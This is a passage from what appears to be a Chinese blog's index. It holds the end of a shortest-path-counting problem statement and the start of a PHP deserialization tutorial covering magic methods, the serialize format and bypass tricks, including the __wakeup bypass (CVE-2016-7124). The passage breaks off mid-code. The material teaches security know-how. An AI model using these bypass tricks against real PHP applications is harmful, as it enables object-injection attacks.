style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> 的边，请注意可能有自环与重边。</p><h2 id="输出格式-2"><a class="markdownIt-Anchor" href="#输出格式-2">#</a> 输出格式</h2><p>共 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 行，每行一个非负整数，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> 行输出从顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> 到顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> 有多少条不同的最短路，由于答案有可能会很大，你只需要输出 $ ans \bmod 100003$ 后的结果即可。如果无法到达顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> 则输出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>。</p><h2 id="样例-1-2"><a class="markdownIt-Anchor" href="#样例-1-2">#</a> 样例 #1</h2><h3 id="样例输入-1-2"><a class="markdownIt-Anchor" href="#样例输入-1-2">#</a> 样例输入 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5 7</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">2 4</span><br><span class="line">3 4</span><br><span class="line">2 3</span><br><span class="line">4 5</span><br><span class="line">4 5</span><br></pre></td></tr></table></figure><h3 id="样例输出-1-2"><a class="markdownIt-Anchor" href="#样例输出-1-2">#</a> 样例输出 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h2 id="提示-2"><a class="markdownIt-Anchor" href="#提示-2">#</a> 提示</h2><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span> 的最短路有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span> 条，分别为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 条 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mn>2</mn><mo>→</mo><mn>4</mn><mo>→</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">1\to 2\to 4\to 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 条 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mn>3</mn><mo>→</mo><mn>4</mn><mo>→</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">1\to 3\to 4\to 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span>（由于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>→</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">4\to 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span> 的边有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 条）。</p><p>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">20\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">%</span></span></span></span> 的数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">1\le N \le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span></span></span></span>；<br>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>60</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">60\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">6</span><span class="mord">0</span><span class="mord">%</span></span></span></span> 的数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">1\le N \le 10^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span>；<br>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>100</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">100\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">%</span></span></span></span> 的数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup></mrow><annotation encoding="application/x-tex">1\le N\le10^6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>M</mi><mo>≤</mo><mn>2</mn><mo>×</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup></mrow><annotation encoding="application/x-tex">1\le M\le 2\times 10^6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span>。</p><h1 id="题解-3"><a class="markdownIt-Anchor" href="#题解-3">#</a> 题解</h1>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深搜 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2023/11/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/11/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="php序列化问题-主要是找链-分析代码"><a class="markdownIt-Anchor" href="#php序列化问题-主要是找链-分析代码">#</a> PHP 序列化问题 -&gt; 主要是找链 分析代码</h2><h3 id="反序列化魔术方法"><a class="markdownIt-Anchor" href="#反序列化魔术方法">#</a> 反序列化魔术方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()<span class="comment">//当一个对象创建时被调用</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//当一个对象销毁时被调用</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//当一个对象被当作一个字符串使用</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()<span class="comment">//在对象在被序列化之前运行</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()<span class="comment">//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>()<span class="comment">//获得一个类的成员变量时调用</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>()<span class="comment">//设置一个类的成员变量时调用</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()<span class="comment">//调用函数的方式调用一个对象时的回应方法</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>()<span class="comment">//当调用一个对象中的不能用的方法的时候就会执行这个函数</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//执行unserialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() <span class="comment">//执行serialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><h3 id="简介"><a class="markdownIt-Anchor" href="#简介">#</a> 简介</h3><p>序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p><p>在网上找到一个比较形象的例子</p><blockquote><p>比如：现在我们都会在淘宝上买桌子，桌子这种很不规则的东西，该怎么从一个城市运输到另一个城市，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。</p></blockquote><p>php 将数据序列化和反序列化会用到两个函数</p><p><strong>serialize</strong> 将对象格式化成有序的字符串</p><p><strong>unserialize</strong> 将字符串还原成原来的对象</p><p>序列化的目的是方便数据的传输和存储，在 PHP 中，序列化和反序列化一般用做缓存，比如 session 缓存，cookie 等。</p><h3 id="常见的序列化格式"><a class="markdownIt-Anchor" href="#常见的序列化格式">#</a> 常见的序列化格式</h3><p>了解即可</p><ul><li>二进制格式</li><li>字节数组</li><li>json 字符串</li><li>xml 字符串</li></ul><h3 id="案例引入"><a class="markdownIt-Anchor" href="#案例引入">#</a> 案例引入</h3><p>简单的例子 (以数组为例子)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">array</span>(<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;zi&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$user</span>.PHP_EOL);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>));</span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;xiao&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;shi&quot;</span>;i:<span class="number">2</span>;s:<span class="number">2</span>:<span class="string">&quot;zi&quot;</span>;&#125;</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; xiao</span><br><span class="line">    [<span class="number">1</span>] =&gt; shi</span><br><span class="line">    [<span class="number">2</span>] =&gt; zi</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>我们对上面这个例子做个简单讲解，方便大家入门</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;xiao&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;shi&quot;</span>;i:<span class="number">2</span>;s:<span class="number">2</span>:<span class="string">&quot;zi&quot;</span>;&#125;</span><br><span class="line">a:<span class="keyword">array</span>代表是数组，后面的<span class="number">3</span>说明有三个属性</span><br><span class="line">i:代表是整型数据<span class="keyword">int</span>，后面的<span class="number">0</span>是数组下标</span><br><span class="line">s:代表是字符串，后面的<span class="number">4</span>是因为xiao长度为<span class="number">4</span></span><br><span class="line">    </span><br><span class="line">依次类推</span><br></pre></td></tr></table></figure><p>序列化后的内容只有成员变量，没有成员函数，比如下面的例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable language_">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出 (O 代表 Object 是对象的意思，也是类)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;xiaoshizi&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>而如果变量前是 protected，则会在变量名前加上 <code>\x00*\x00</code> ,private 则会在变量名前加上 <code>\x00类名\x00</code> , 输出时一般需要 url 编码，若在本地存储更推荐采用 base64 编码的形式，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable language_">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这时候输出则会导致不可见字符 <code>\x00</code>  的丢失 (故要 urlencode)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot; * a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;xiaoshizi&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot; test b&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="反序列化绕过小trick"><a class="markdownIt-Anchor" href="#反序列化绕过小trick">#</a> 反序列化绕过小 Trick</h3><h4 id="php71反序列化对类属性不敏感"><a class="markdownIt-Anchor" href="#php71反序列化对类属性不敏感">#</a> php7.1 + 反序列化对类属性不敏感</h4><p>我们前面说了如果变量前是 protected，序列化结果会在变量名前加上 <code>\x00*\x00</code></p><p>但在特定版本 7.1 以上则对于类属性不敏感，比如下面的例子即使没有 <code>\x00*\x00</code>  也依然会输出 <code>abc</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="绕过__wakeupcve-2016-7124"><a class="markdownIt-Anchor" href="#绕过__wakeupcve-2016-7124">#</a> 绕过__wakeup (CVE-2016-7124)</h4><blockquote><p>版本：<br>PHP5 &lt; 5.6.25<br>​ PHP7 &lt; 7.0.10</p></blockquote><p>利用方式： <code>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</code> <br>对于下面这样一个自定义类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    